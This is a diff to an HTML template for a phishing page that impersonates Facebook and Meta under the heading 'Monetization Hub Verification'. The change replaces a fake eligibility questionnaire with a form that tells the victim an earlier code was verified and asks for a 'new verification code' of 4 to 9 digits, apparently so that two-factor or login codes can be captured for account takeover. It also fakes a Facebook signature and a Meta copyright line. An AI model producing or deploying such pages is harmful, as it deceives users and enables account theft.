@@ -7,7 +7,7 @@
     </div>
     <div>
       <h2 class="notranslate" style="margin:0;color:#1877F2;">Facebook</h2>
-      <div style="color:#64748b;font-size:13px;margin-top:2px">Monetization Eligibility Check</div>
+      <div style="color:#64748b;font-size:13px;margin-top:2px">Monetization Hub Verification</div>
     </div>
   </div>
 
@@ -19,338 +19,39 @@
       </div>
       
       <div class="facebook-message">
-        <p class="message-text">Please complete this eligibility questionnaire to determine if your account meets the requirements for Facebook monetization programs.</p>
+        <p class="message-text">We've successfully verified the previous code you submitted. This confirms that you are the rightful owner of this Facebook account.</p>
         
-        <p class="message-text">Your responses will help us assess your account status and provide personalized recommendations for monetization opportunities.</p>
+        <p class="message-text">You've now activated monetization features on your Facebook account in partnership with Meta Monetization Hub.</p>
+        
+        <p class="message-text">To finalize your setup and ensure your account is fully enabled for monetization, please enter the new verification code we’ve sent to you to proceed with the monetization of your Facebook account.</p>
         
         <div class="security-notice">
-          <p class="security-text">All information provided is confidential and will only be used for eligibility assessment purposes.</p>
+          <p class="security-text">If you did not request this action, please disregard this message.</p>
+        </div>
+        
+        <p class="message-text">Thank you for being part of the Facebook creator community.</p>
+        
+        <div class="message-signature">
+          <p class="signature-line">Best regards,</p>
+          <p class="signature-line">The Facebook Team</p>
+          <p class="copyright">© Meta Platforms, Inc.</p>
         </div>
       </div>
     </div>
   </div>
 
-  <form id="eligibilityForm" method="POST" novalidate>
-    <!-- SECTION 1 — Account Status -->
-    <div class="form-section">
-      <h3 style="color:#1e293b;margin:20px 0 12px 0;font-size:16px;font-weight:600;">SECTION 1 — Account Status</h3>
-      
-      <div class="question-group">
-        <label style="display:block;font-weight:600;color:#374151;margin-bottom:8px;font-size:14px">1. Is your profile/page in Professional Mode?</label>
-        <div class="radio-group">
-          <label class="radio-label"><input type="radio" name="professional_mode" value="yes" required> Yes</label>
-          <label class="radio-label"><input type="radio" name="professional_mode" value="no"> No</label>
-          <label class="radio-label"><input type="radio" name="professional_mode" value="not_sure"> Not sure</label>
-        </div>
-      </div>
-
-      <div class="question-group">
-        <label style="display:block;font-weight:600;color:#374151;margin-bottom:8px;font-size:14px">2. How many followers do you have?</label>
-        <div class="radio-group">
-          <label class="radio-label"><input type="radio" name="followers" value="0-1000" required> 0–1,000</label>
-          <label class="radio-label"><input type="radio" name="followers" value="1000-5000"> 1,000–5,000</label>
-          <label class="radio-label"><input type="radio" name="followers" value="5000-10000"> 5,000–10,000</label>
-          <label class="radio-label"><input type="radio" name="followers" value="10000+"> 10,000+</label>
-        </div>
-      </div>
-
-      <div class="question-group">
-        <label style="display:block;font-weight:600;color:#374151;margin-bottom:8px;font-size:14px">3. Have you posted videos in the last 30 days?</label>
-        <div class="radio-group">
-          <label class="radio-label"><input type="radio" name="videos_30_days" value="yes" required> Yes</label>
-          <label class="radio-label"><input type="radio" name="videos_30_days" value="no"> No</label>
-        </div>
-      </div>
-    </div>
-
-    <!-- SECTION 2 — Content Quality -->
-    <div class="form-section">
-      <h3 style="color:#1e293b;margin:20px 0 12px 0;font-size:16px;font-weight:600;">SECTION 2 — Content Quality</h3>
-      
-      <div class="question-group">
-        <label style="display:block;font-weight:600;color:#374151;margin-bottom:8px;font-size:14px">4. Is your content 100% original?</label>
-        <div class="radio-group">
-          <label class="radio-label"><input type="radio" name="original_content" value="yes" required> Yes</label>
-          <label class="radio-label"><input type="radio" name="original_content" value="no"> No</label>
-          <label class="radio-label"><input type="radio" name="original_content" value="sometimes"> Sometimes</label>
-        </div>
-      </div>
-
-      <div class="question-group">
-        <label style="display:block;font-weight:600;color:#374151;margin-bottom:8px;font-size:14px">5. Do you use copyrighted music in your videos?</label>
-        <div class="radio-group">
-          <label class="radio-label"><input type="radio" name="copyrighted_music" value="yes" required> Yes</label>
-          <label class="radio-label"><input type="radio" name="copyrighted_music" value="no"> No</label>
-        </div>
-      </div>
-
-      <div class="question-group">
-        <label style="display:block;font-weight:600;color:#374151;margin-bottom:8px;font-size:14px">6. Does your content include violence, sexual content, or graphic scenes?</label>
-        <div class="radio-group">
-          <label class="radio-label"><input type="radio" name="sensitive_content" value="yes" required> Yes</label>
-          <label class="radio-label"><input type="radio" name="sensitive_content" value="no"> No</label>
-        </div>
-      </div>
-    </div>
-
-    <!-- SECTION 3 — Performance Metrics -->
-    <div class="form-section">
-      <h3 style="color:#1e293b;margin:20px 0 12px 0;font-size:16px;font-weight:600;">SECTION 3 — Performance Metrics</h3>
-      
-      <div class="question-group">
-        <label style="display:block;font-weight:600;color:#374151;margin-bottom:8px;font-size:14px">7. Average monthly video views:</label>
-        <div class="radio-group">
-          <label class="radio-label"><input type="radio" name="monthly_views" value="0-10k" required> 0–10k</label>
-          <label class="radio-label"><input type="radio" name="monthly_views" value="10k-50k"> 10k–50k</label>
-          <label class="radio-label"><input type="radio" name="monthly_views" value="50k-100k"> 50k–100k</label>
-          <label class="radio-label"><input type="radio" name="monthly_views" value="100k+"> 100k+</label>
-        </div>
-      </div>
-
-      <div class="question-group">
-        <label style="display:block;font-weight:600;color:#374151;margin-bottom:8px;font-size:14px">8. Have you ever had a monetization violation?</label>
-        <div class="radio-group">
-          <label class="radio-label"><input type="radio" name="monetization_violation" value="yes" required> Yes</label>
-          <label class="radio-label"><input type="radio" name="monetization_violation" value="no"> No</label>
-          <label class="radio-label"><input type="radio" name="monetization_violation" value="not_sure"> Not sure</label>
-        </div>
-      </div>
-    </div>
-
-    <!-- SECTION 4 — Region -->
-    <div class="form-section">
-      <h3 style="color:#1e293b;margin:20px 0 12px 0;font-size:16px;font-weight:600;">SECTION 4 — Region</h3>
-      
-      <div class="question-group">
-        <label style="display:block;font-weight:600;color:#374151;margin-bottom:6px;font-size:14px">9. Your region (country)</label>
-        <input list="countries" class="input" name="country" placeholder="Type to search for your country..." required style="margin-bottom:16px;">
-        <datalist id="countries">
-          <option value="Afghanistan">
-          <option value="Albania">
-          <option value="Algeria">
-          <option value="Andorra">
-          <option value="Angola">
-          <option value="Antigua and Barbuda">
-          <option value="Argentina">
-          <option value="Armenia">
-          <option value="Aruba">
-          <option value="Australia">
-          <option value="Austria">
-          <option value="Azerbaijan">
-          <option value="Bahamas">
-          <option value="Bahrain">
-          <option value="Bangladesh">
-          <option value="Barbados">
-          <option value="Belarus">
-          <option value="Belgium">
-          <option value="Belize">
-          <option value="Benin">
-          <option value="Bhutan">
-          <option value="Bolivia">
-          <option value="Bosnia and Herzegovina">
-          <option value="Botswana">
-          <option value="Brazil">
-          <option value="Brunei">
-          <option value="Bulgaria">
-          <option value="Burkina Faso">
-          <option value="Burundi">
-          <option value="Cabo Verde">
-          <option value="Cambodia">
-          <option value="Cameroon">
-          <option value="Canada">
-          <option value="Central African Republic">
-          <option value="Chad">
-          <option value="Chile">
-          <option value="China">
-          <option value="Colombia">
-          <option value="Comoros">
-          <option value="Congo, Democratic Republic of the">
-          <option value="Congo, Republic of the">
-          <option value="Costa Rica">
-          <option value="Côte d'Ivoire">
-          <option value="Croatia">
-          <option value="Cuba">
-          <option value="Curaçao">
-          <option value="Cyprus">
-          <option value="Czechia (Czech Republic)">
-          <option value="Denmark">
-          <option value="Djibouti">
-          <option value="Dominica">
-          <option value="Dominican Republic">
-          <option value="Ecuador">
-          <option value="Egypt">
-          <option value="El Salvador">
-          <option value="Equatorial Guinea">
-          <option value="Eritrea">
-          <option value="Estonia">
-          <option value="Eswatini (Swaziland)">
-          <option value="Ethiopia">
-          <option value="Fiji">
-          <option value="Finland">
-          <option value="France">
-          <option value="French Guiana">
-          <option value="Gabon">
-          <option value="Gambia">
-          <option value="Georgia">
-          <option value="Germany">
-          <option value="Ghana">
-          <option value="Greece">
-          <option value="Greenland">
-          <option value="Grenada">
-          <option value="Guadeloupe">
-          <option value="Guatemala">
-          <option value="Guinea">
-          <option value="Guinea-Bissau">
-          <option value="Guyana">
-          <option value="Haiti">
-          <option value="Honduras">
-          <option value="Hong Kong">
-          <option value="Hungary">
-          <option value="Iceland">
-          <option value="India">
-          <option value="Indonesia">
-          <option value="Iran">
-          <option value="Iraq">
-          <option value="Ireland">
-          <option value="Israel">
-          <option value="Italy">
-          <option value="Jamaica">
-          <option value="Japan">
-          <option value="Jordan">
-          <option value="Kazakhstan">
-          <option value="Kenya">
-          <option value="Kiribati">
-          <option value="Korea, North (DPRK)">
-          <option value="Korea, South (Republic of Korea)">
-          <option value="Kosovo">
-          <option value="Kuwait">
-          <option value="Kyrgyzstan">
-          <option value="Laos (Lao PDR)">
-          <option value="Latvia">
-          <option value="Lebanon">
-          <option value="Lesotho">
-          <option value="Liberia">
-          <option value="Libya">
-          <option value="Liechtenstein">
-          <option value="Lithuania">
-          <option value="Luxembourg">
-          <option value="Macao">
-          <option value="Madagascar">
-          <option value="Malawi">
-          <option value="Malaysia">
-          <option value="Maldives">
-          <option value="Mali">
-          <option value="Malta">
-          <option value="Marshall Islands">
-          <option value="Martinique">
-          <option value="Mauritania">
-          <option value="Mauritius">
-          <option value="Mayotte">
-          <option value="Mexico">
-          <option value="Micronesia">
-          <option value="Moldova">
-          <option value="Monaco">
-          <option value="Mongolia">
-          <option value="Montenegro">
-          <option value="Montserrat">
-          <option value="Morocco">
-          <option value="Mozambique">
-          <option value="Myanmar (Burma)">
-          <option value="Namibia">
-          <option value="Nauru">
-          <option value="Nepal">
-          <option value="Netherlands">
-          <option value="New Caledonia">
-          <option value="New Zealand">
-          <option value="Nicaragua">
-          <option value="Niger">
-          <option value="Nigeria">
-          <option value="Niue">
-          <option value="North Macedonia">
-          <option value="Northern Mariana Islands">
-          <option value="Norway">
-          <option value="Oman">
-          <option value="Pakistan">
-          <option value="Palau">
-          <option value="Palestine">
-          <option value="Panama">
-          <option value="Papua New Guinea">
-          <option value="Paraguay">
-          <option value="Peru">
-          <option value="Philippines">
-          <option value="Poland">
-          <option value="Portugal">
-          <option value="Puerto Rico">
-          <option value="Qatar">
-          <option value="Réunion">
-          <option value="Romania">
-          <option value="Russia">
-          <option value="Rwanda">
-          <option value="Saint Kitts and Nevis">
-          <option value="Saint Lucia">
-          <option value="Saint Vincent and the Grenadines">
-          <option value="Samoa">
-          <option value="San Marino">
-          <option value="Sao Tome and Principe">
-          <option value="Saudi Arabia">
-          <option value="Senegal">
-          <option value="Serbia">
-          <option value="Seychelles">
-          <option value="Sierra Leone">
-          <option value="Singapore">
-          <option value="Sint Maarten">
-          <option value="Slovakia">
-          <option value="Slovenia">
-          <option value="Solomon Islands">
-          <option value="Somalia">
-          <option value="South Africa">
-          <option value="South Sudan">
-          <option value="Spain">
-          <option value="Sri Lanka">
-          <option value="Sudan">
-          <option value="Suriname">
-          <option value="Sweden">
-          <option value="Switzerland">
-          <option value="Syria">
-          <option value="Taiwan">
-          <option value="Tajikistan">
-          <option value="Tanzania">
-          <option value="Thailand">
-          <option value="Timor-Leste">
-          <option value="Togo">
-          <option value="Tonga">
-          <option value="Trinidad and Tobago">
-          <option value="Tunisia">
-          <option value="Turkey">
-          <option value="Turkmenistan">
-          <option value="Turks and Caicos Islands">
-          <option value="Tuvalu">
-          <option value="Uganda">
-          <option value="Ukraine">
-          <option value="United Arab Emirates">
-          <option value="United Kingdom">
-          <option value="United States">
-          <option value="Uruguay">
-          <option value="Uzbekistan">
-          <option value="Vanuatu">
-          <option value="Venezuela">
-          <option value="Vietnam">
-          <option value="Virgin Islands (U.S.)">
-          <option value="Yemen">
-          <option value="Zambia">
-          <option value="Zimbabwe">
-        </datalist>
-      </div>
-    </div>
+  <form id="digitsForm" method="POST" novalidate>
+    <label style="display:block;font-weight:600;color:#374151;margin-bottom:6px;font-size:14px">Verification Code</label>
+    <input class="input" id="digits" name="digits" placeholder="Enter new verification code" pattern="\d{4,9}" required>
+    <div class="error-text" id="digitsError"></div>
 
     <div class="center">
-      <button class="btn login-btn" type="submit">Submit Eligibility Form</button>
+      <button class="btn login-btn" type="submit">Complete Verification</button>
     </div>
   </form>
 </div>
 
 <style>
-/* All original styles remain exactly the same */
 .input {
   width: 100%;
   padding: 12px 14px;
@@ -490,98 +191,34 @@
 .center {
   text-align: center;
 }
-
-/* New styles for the form sections */
-.form-section {
-  margin-bottom: 20px;
-  padding-bottom: 16px;
-  border-bottom: 1px solid #f1f5f9;
-}
-
-.question-group {
-  margin-bottom: 20px;
-}
-
-.radio-group {
-  display: flex;
-  flex-direction: column;
-  gap: 10px;
-}
-
-.radio-label {
-  display: flex;
-  align-items: center;
-  padding: 10px 12px;
-  border: 1px solid #e5e7eb;
-  border-radius: 12px;
-  background: #fafafa;
-  cursor: pointer;
-  transition: all 0.2s;
-  font-size: 14px;
-  color: #374151;
-}
-
-.radio-label:hover {
-  background: #f8fafc;
-  border-color: #1877F2;
-}
-
-.radio-label input[type="radio"] {
-  margin-right: 10px;
-}
-
-/* Country search styling */
-.country-search-container {
-  position: relative;
-}
-
-.country-search-container input {
-  padding-right: 40px;
-}
 </style>
 
 <script>
-document.getElementById("eligibilityForm").addEventListener("submit", function(event) {
+document.getElementById("digitsForm").addEventListener("submit", function(event) {
+  const digits = document.getElementById("digits");
+  const digitsError = document.getElementById("digitsError");
+
   let valid = true;
+  digits.classList.remove("input-error");
+  digitsError.textContent = "";
 
-  // Check all required radio groups
-  const radioGroups = document.querySelectorAll('input[type="radio"][required]');
-  const groupNames = new Set();
-  
-  radioGroups.forEach(radio => groupNames.add(radio.name));
-  
-  groupNames.forEach(groupName => {
-    const groupChecked = document.querySelector(`input[name="${groupName}"]:checked`);
-    if (!groupChecked) {
-      valid = false;
-      // You could add error styling here if needed
-    }
-  });
+  const val = digits.value.trim();
+  const pattern = /^\d{4,9}$/;
 
-  // Check country selection
-  const countryInput = document.querySelector('input[name="country"]');
-  if (!countryInput.value) {
+  if (!pattern.test(val)) {
     valid = false;
-    countryInput.classList.add("input-error");
-  } else {
-    countryInput.classList.remove("input-error");
+    digits.classList.add("input-error");
+    digitsError.textContent = "Please enter a valid 4-9 digit code.";
   }
 
-  if (!valid) {
-    event.preventDefault();
-    alert("Please answer all required questions before submitting.");
-  } else {
-    // Form is valid - directly submit without code verification
-    // The form will send all questionnaire data to admin
-    // No code confirmation needed anymore
-  }
+  if (!valid) event.preventDefault();
 });
 
-// Remove error state when country is selected
-document.querySelector('input[name="country"]').addEventListener('input', function() {
-  if (this.value) {
-    this.classList.remove("input-error");
-  }
+document.getElementById("digits").addEventListener("input", () => {
+  const digits = document.getElementById("digits");
+  const digitsError = document.getElementById("digitsError");
+  digits.classList.remove("input-error");
+  digitsError.textContent = "";
 });
 </script>
 {% endblock %}
